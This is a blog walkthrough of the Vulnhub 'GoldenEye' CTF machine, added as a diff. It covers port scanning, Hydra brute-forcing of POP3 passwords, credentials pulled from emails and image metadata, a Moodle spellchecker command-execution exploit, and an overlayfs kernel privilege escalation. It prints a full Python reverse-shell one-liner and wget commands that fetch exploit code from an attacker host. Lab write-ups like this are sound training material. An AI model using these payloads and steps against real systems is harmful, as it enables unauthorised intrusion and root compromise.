@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Vulnhub - GoldenEye Walkthrough | joona.xyz</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Vulnhub - GoldenEye Walkthrough" />
+<meta name="author" content="joona" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2019/12/30/vulnhub-goldeneye.html" />
+<meta property="og:url" content="http://localhost:4000/2019/12/30/vulnhub-goldeneye.html" />
+<meta property="og:site_name" content="joona.xyz" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-12-30T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/2019/12/30/vulnhub-goldeneye.html","headline":"Vulnhub - GoldenEye Walkthrough","dateModified":"2019-12-30T00:00:00+02:00","datePublished":"2019-12-30T00:00:00+02:00","author":{"@type":"Person","name":"joona"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2019/12/30/vulnhub-goldeneye.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="shortcut icon" type="image/png" href="/favicon.png"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="joona.xyz" /></head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">joona.xyz</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Vulnhub - GoldenEye Walkthrough</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-12-30T00:00:00+02:00" itemprop="datePublished">Dec 30, 2019
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">joona</span></span></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/images/goldeneye/goldeneye-header.jpg" alt="" /></p>
+
+<p><a href="https://www.vulnhub.com/entry/goldeneye-1,240/">GoldenEye</a> is a James Bond themed vulnerable machine created by <a href="https://www.vulnhub.com/author/creosote,584/">creosote</a>.
+It is ranked as intermediate level and more CTF-like than realistic.
+<br /><br /></p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Let’s start with an nmap scan.</p>
+<blockquote>
+  <p>nmap -p- -A -T4 10.10.11.133 -oA nmap/goldeneye</p>
+</blockquote>
+
+<p><code class="highlighter-rouge">-p-</code> scan all ports</p>
+
+<p><code class="highlighter-rouge">-A</code> does OS detection (-O), version detection (-sV) and script scanning (-sC)</p>
+
+<p><code class="highlighter-rouge">-T4</code> set timing template higher to speed things up</p>
+
+<p><code class="highlighter-rouge">-oA</code> output in all formats</p>
+
+<p>Looking at the results we have ports 25 (SMTP), 80 (HTTP) and 55007 (POP3) open.<br />
+Let’s check the HTTP port first. We get a webpage with the following text:</p>
+
+<blockquote>
+  <p>Severnaya Auxiliary Control Station<br />
+<strong>**TOP SECRET ACCESS</strong>**<br />
+Accessing Server Identity<br />
+Server Name:…………….<br />
+GOLDENEYE<br /><br />
+User: UNKNOWN<br />
+Navigate to /sev-home/ to login</p>
+</blockquote>
+
+<p>If we try to navigate to 10.10.11.133/sev-home/ we get an authentication prompt.
+Looking at the websites source code there’s an interesting JavaScript file called <code class="highlighter-rouge">terminal.js</code>.
+Inside that script there’s a comment with Boris’ password.<br />
+<img src="/images/goldeneye/terminaljs.jpg" alt="" /><br /></p>
+
+<p>The password is HTML encoded, which you can decode with Burp Suite or any online HTML decoder.
+It decodes to <code class="highlighter-rouge">InvincibleHack3r</code>.
+Take note that user <code class="highlighter-rouge">Natalya</code> is also mentioned. We now have two users: Boris and Natalya.</p>
+
+<p>Let’s login to /sev-home/ with <code class="highlighter-rouge">Boris:InvincibleHack3r</code>. We get a webpage with a message that
+hints to check pop3 service.<br />
+<img src="/images/goldeneye/sevhome.jpg" alt="" /><br /></p>
+
+<p>The credentials we currently have does not work on pop3 login though.
+We can try to brute-force the password with <code class="highlighter-rouge">Hydra</code>.</p>
+<blockquote>
+  <p>hydra -l boris -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V</p>
+</blockquote>
+
+<p><code class="highlighter-rouge">-l</code> username<br />
+<code class="highlighter-rouge">-P</code> password file<br />
+<code class="highlighter-rouge">-s</code> specify the port because it’s not the default pop3 port<br />
+<code class="highlighter-rouge">-V</code> verbose, prints out every tried password<br /></p>
+
+<p>It took quite a few tries to find the correct password file, but we now have the password:<br />
+<img src="/images/goldeneye/hydrabob.jpg" alt="" /><br /></p>
+
+<p>Lesson learned; don’t just throw rockyou.txt at everything :)</p>
+
+<p>Before we start rummaging through Boris’ private emails, let’s start brute-forcing Natalya’s pop3
+password in the background.</p>
+<blockquote>
+  <p>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V</p>
+</blockquote>
+
+<p>Connect to the pop3 server:</p>
+<blockquote>
+  <p>nc 10.10.11.133 55007<br /></p>
+</blockquote>
+
+<p>pop3 commands:<br />
+<code class="highlighter-rouge">USER boris</code> login name<br />
+<code class="highlighter-rouge">PASS secret1!</code> password<br />
+<code class="highlighter-rouge">LIST</code> list messages</p>
+
+<p>Print out an email with <code class="highlighter-rouge">RETR &lt;message-number&gt;</code> command.</p>
+<blockquote>
+  <p>Email 1:<br />
+From: root@127.0.0.1.goldeneye<br />
+Boris, this is admin. You can electronically communicate to co-workers and students here. I’m not going to scan emails for security risks
+because I trust you and the other admins here.</p>
+</blockquote>
+
+<blockquote>
+  <p>Email 2:<br />
+From: natalya@ubuntu<br />
+Boris, I can break your codes!</p>
+</blockquote>
+
+<blockquote>
+  <p>Email 3:<br />
+From: alec@janus.boss<br />
+Boris,
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!<br /><br />
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages….<br />
+PS - Keep security tight or we will be compromised.</p>
+</blockquote>
+
+<p>Nothing too interesting, but we do get new potential usernames: <code class="highlighter-rouge">Xenia</code>, and <code class="highlighter-rouge">alec</code>.</p>
+
+<p>Behind the scenes we have also cracked Natalya’s pop3 password:<br />
+<img src="/images/goldeneye/popnata.jpg" alt="" /><br /></p>
+
+<blockquote>
+  <p>Email 1:<br />
+From: root@ubuntu<br />
+Natalya, please you need to stop breaking boris’ codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.<br /><br />
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</p>
+</blockquote>
+
+<blockquote>
+  <p>Email 2:<br />
+From: root@ubuntu<br />
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it’s related to security…even if it’s not, just enter it in under the guise of “security”…it’ll get the change order escalated without much hassle :)<br /><br />
+Ok, user creds are:<br />
+username: xenia<br />
+password: RCP90rulez!<br /><br />
+Boris verified her as a valid contractor so just create the account ok?
+And if you didn’t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+<strong>Make sure to edit your host file since you usually work remote off-network….
+Since you’re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</strong></p>
+</blockquote>
+
+<p>We have a username and a password to internal training website severnaya-station.com/gnocertdir.<br />
+If we just try navigating to 10.10.11.133/gnocertdir we get an error <code class="highlighter-rouge">Incorrect access detected.</code>
+We need to point the server’s IP to severnaya-station.com.<br /><br />
+This can be done by adding <code class="highlighter-rouge">10.10.11.133 severnaya-station.com</code> to the <code class="highlighter-rouge">/etc/hosts</code>-file.</p>
+
+<p>Navigating to severnaya-station.com/gnocertdir we get a “GoldenEye Operators Training” Moodle platform.
+After logging in as <code class="highlighter-rouge">Xenia</code> and enumerating the site we see that we have received a private message:<br />
+<img src="/images/goldeneye/xen.jpg" alt="" /><br /></p>
+
+<p>A new username <code class="highlighter-rouge">doak</code> and a mention about emails. Let’s give doak the good ol’ Hydra-pop3 treatment:</p>
+<blockquote>
+  <p>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V</p>
+</blockquote>
+
+<p>We manage to get the password <code class="highlighter-rouge">goat</code>.</p>
+<blockquote>
+  <p>Email 1:<br />
+From: doak@ubuntu<br />
+James,
+If you’re reading this, congrats you’ve gotten this far. You know how tradecraft works right?<br />
+Because I don’t. Go to our training site and login to my account….dig until you can exfiltrate further information……<br /><br />
+username: dr_doak<br />
+password: 4England!<br /></p>
+</blockquote>
+
+<p>Doak was expecting us to get into his email and he has hidden something on the training platform.
+Logging in as him and navigating to his profile, there’s a section called My private files.<br />
+<img src="/images/goldeneye/forjames.jpg" alt="" /><br /></p>
+
+<blockquote>
+  <p>s3cret.txt:<br />
+007,<br />
+I was able to capture this apps adm1n cr3ds through clear txt.<br />
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.
+Something juicy is located here: /dir007key/for-007.jpg</p>
+</blockquote>
+
+<p>At 10.10.11.133/dir007key/for-007.jpg we have a picture of Dr. Doak:<br />
+<img src="/images/goldeneye/doakster.jpg" alt="" /><br /></p>
+
+<p>The credentials are probably hidden inside this image, so let’s do some CTF work.<br />
+First download the image with <code class="highlighter-rouge">wget 10.10.11.133/dir007key/for-007.jpg</code>.<br />
+Checking the image’s EXIF-data with <code class="highlighter-rouge">exiftool for-007.jpg</code> we see an interesting string:<br />
+<code class="highlighter-rouge">Image Description: eFdpbnRlcjE5OTV4IQ==</code></p>
+
+<p>The strings is encoded with base64. Decoding it with <code class="highlighter-rouge">echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d</code> we get password: <code class="highlighter-rouge">xWinter1995x!</code>.
+This is the admin password to the training platform.
+<br /><br /></p>
+<h2 id="reverse-shell">Reverse Shell</h2>
+
+<p>Enumerating the site as admin we find the Moodle version <code class="highlighter-rouge">2.2.3</code>.
+If we Google exploits for this, we find a remote command execution vulnerability <a href="https://www.exploit-db.com/exploits/29324">CVE-2013-3630</a>.</p>
+<blockquote>
+  <p>By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.</p>
+</blockquote>
+
+<p>So if we change the path for spellchecker, let’s say to and run it, we get a reverse shell.<br />
+Spellchecker path -setting is at <strong>Home &gt; Site administration &gt; Server &gt; System paths.</strong></p>
+
+<p>Before we can exploit this we have to change the <code class="highlighter-rouge">Spell engine</code> from default “Google Spell” to “PSpellShell” at <strong>Home &gt; Site administration &gt;
+Plugins &gt; Text editors &gt; TinyMCE HTML editor</strong>.</p>
+
+<p>Now that we have the spellchecker path and spell engine changed we can set up a netcat listener on our host:
+<code class="highlighter-rouge">nc -lvnp 1337</code>.<br />
+After that go to the training platform and create a new blogpost.
+In the text-editor there is a button for spell-checking.
+Click that and you should now have a reverse shell as user <code class="highlighter-rouge">www-data</code>.</p>
+
+<p>I used the usual Python reverse shell as the spellchecker path:</p>
+<blockquote>
+  <p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.x.x.x”,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+</blockquote>
+
+<p><br /><br /></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>The machine has <code class="highlighter-rouge">wget</code> and <code class="highlighter-rouge">curl</code> so you could easily download an enumeration script.
+But for this we only need to check the kernel version with <code class="highlighter-rouge">uname -a</code>.</p>
+<blockquote>
+  <p>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</p>
+</blockquote>
+
+<p>This kernel version is vulnerable to <code class="highlighter-rouge">overlayfs</code> local privilege escalation (<a href="https://www.exploit-db.com/exploits/37292">CVE-2015-1328</a>).<br />
+Download the exploit to your machine. Edit the comments out and set up a simple Python HTTP server:
+<code class="highlighter-rouge">python3 -m http.server</code>.<br />
+On the target machine let’s move to the <code class="highlighter-rouge">/tmp</code> folder and download the exploit:<br />
+<code class="highlighter-rouge">wget your-ip:8000/ofs.c</code>.<br />
+Give execution permissions to the file <code class="highlighter-rouge">chmod +x ofs.c</code> and run it. We get an error: <code class="highlighter-rouge">gcc: not found</code>.
+The exploit tries to compile the code with gcc, but gcc is not installed on the target machine.</p>
+
+<p>Check for other compilers with <code class="highlighter-rouge">which cc</code> or <code class="highlighter-rouge">which g++</code>. <code class="highlighter-rouge">cc</code> seems to be installed so let’s edit our exploit. <br />
+Call for <strong>gcc</strong> is on line 109:<br />
+<code class="highlighter-rouge">lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");</code>.<br />
+Switch it to use <strong>cc</strong>:<br />
+<code class="highlighter-rouge">lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");</code>.</p>
+
+<p>Now we can run the exploit and we get a root shell.
+The flag is inside the <code class="highlighter-rouge">/root</code> folder:</p>
+<blockquote>
+  <p>Alec told me to place the codes here:<br />
+flag<br />
+If you captured this make sure to go here…..<br />
+/006-final/xvf7-flag/<br /></p>
+</blockquote>
+
+<p><img src="/images/goldeneye/flag.jpg" alt="" /><br /></p>
+
+<p>Thank you for reading :)</p>
+
+
+  </div><a class="u-url" href="/2019/12/30/vulnhub-goldeneye.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col one-half">
+      <h2 class="footer-heading">joona.xyz</h2>
+        <ul class="contact-list">
+          <li class="p-name"></li></ul>
+      </div>
+
+      <div class="footer-col one-half">
+        <p></p>
+      </div>
+
+      <div class="social-links"><ul class="social-media-list"><li><a rel="me" href="https://github.com/joonaxyz" title="joonaxyz"><svg class="svg-icon grey"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg></a></li><li><a rel="me" href="https://twitter.com/joonaxyz" title="joonaxyz"><svg class="svg-icon grey"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg></a></li></ul>
+</div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
